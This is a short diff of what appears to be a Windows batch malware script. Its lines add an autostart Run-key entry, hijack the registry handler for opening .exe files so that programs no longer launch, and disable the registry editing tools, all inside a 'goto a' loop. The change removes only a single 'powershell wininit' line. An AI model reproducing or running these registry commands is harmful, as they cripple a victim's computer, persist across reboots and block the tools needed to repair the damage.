@@ -55,9 +55,6 @@ reg add "hklm\Software\Microsoft\Windows\CurrentVersion\run" /v SwapNT /t REG_SZ
 reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f 
 
-
-
-powershell wininit
 goto a
 
 
